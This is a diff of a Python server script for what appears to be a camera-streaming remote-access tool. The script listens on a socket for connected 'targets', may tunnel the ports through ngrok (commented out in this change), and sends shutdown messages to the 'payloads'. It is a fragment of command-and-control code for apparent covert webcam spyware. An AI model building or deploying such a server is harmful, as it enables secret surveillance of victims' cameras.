@@ -6,33 +6,11 @@ from prettytable import PrettyTable
 import time
 import json
 import sys
-from assets.colors import colors
-from assets.symbols import *
+#from assets.colors import colors
+#from assets.symbols import *
 from pyngrok import ngrok
 from configparser import ConfigParser
 
-#loading config for ["lhost", "SocketPort", "CameraStreamingPort"]
-CONFIG_FILE = "server/setting/CS-config.ini"
-CONFIG = ConfigParser()
-CONFIG.read(CONFIG_FILE)
-#setting config to var
-HOST = CONFIG["CameraStreaming"]["lhost"]
-PORT = CONFIG["CameraStreaming"]["SocketPort"]
-CAMERA_STREAMING_PORT = CONFIG["CameraStreaming"]["CameraStreamingPort"]
-
-TARGETS = {}
-#start TCP tunnel
-print(f"\r{Splus} {CR.green()}Starting tcp for socket...", end="")
-ngrok.connect(PORT, "tcp")
-print(f"{CR.blue()}Done")
-print(f"\r{Splus} {CR.green()}Starting TCP for CameraStreaming...", end="")
-ngrok.connect(CAMERA_STREAMING_PORT, "tcp")
-print(f"{CR.blue()}Done")
-
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((HOST , PORT))
-server.listen(10)
-#colors class
 class colors (object):
     def red():
         return colorama.Fore.RED
@@ -52,6 +30,29 @@ Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
 Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
 Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
 Ssowrd = f"{CR.red()} ==> {CR.white()}"
+
+#loading config for ["lhost", "SocketPort", "CameraStreamingPort"]
+CONFIG_FILE = "server/setting/CS-config.ini"
+CONFIG = ConfigParser()
+CONFIG.read(CONFIG_FILE)
+#setting config to var
+HOST = CONFIG["CameraStreaming"]["lhost"]
+PORT = int(CONFIG["CameraStreaming"]["socketport"])
+CAMERA_STREAMING_PORT = CONFIG["CameraStreaming"]["camerastreamingport"]
+
+TARGETS = {}
+#start TCP tunnel
+#print(f"\r{Splus} {CR.green()}Starting tcp for socket...", end="")
+#ngrok.connect(PORT, "tcp")
+#print(f"{CR.blue()}Done")
+#print(f"\r{Splus} {CR.green()}Starting TCP for CameraStreaming...", end="")
+#ngrok.connect(CAMERA_STREAMING_PORT, "tcp")
+#print(f"{CR.blue()}Done")
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST , PORT))
+server.listen(10)
+#colors class
 
 #help menu
 def help(TYPE):
@@ -202,3 +203,6 @@ def run():
                     x.send(json.dumps(SHUTDOWN_MSG).encode())
                 except:
                     x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
+
+
+run()
